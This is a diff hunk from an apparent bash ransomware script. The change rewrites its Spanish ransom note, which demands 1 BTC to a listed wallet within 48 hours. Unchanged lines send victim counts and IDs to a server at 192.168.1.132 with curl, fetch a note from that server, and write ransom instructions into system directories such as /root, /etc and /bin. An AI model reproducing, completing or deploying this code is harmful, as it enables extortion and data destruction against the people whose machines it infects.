@@ -256,7 +256,7 @@ curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.p
 for directory in /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/
 do
   {
-    echo "TUS ARCHIVOS SE HAN ENCRIPTADO CON RSA-4096. Visita la página para desencriptar https://192.168.1.132/decrypt.php and the id ${genKey}. Si no realizas el pago de 48 hours, tus datos se perderan para siempre."
+    echo "Tus archivos han sido encriptados con RSA-4096. Para recuperarlos tienes que hacer un pago en los proximas 48 horas. Si no lo haces perderas toda la información. Además la consola se quedara inutilizable. No funciona que apagues o reinicies el sistema, por lo que tienes que pagar el rescate si o si. Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr  https://192.168.1.132/decrypt.php and the id ${genKey}. Si no realizas el pago de 48 hours, tus datos se perderan para siempre."
   } >> "${directory}/INSTRUCTIONS.txt"
 
   curl -k https://192.168.1.132/downloads/INSTRUCTIONS.html >> "${directory}/INSTRUCTIONS.html"
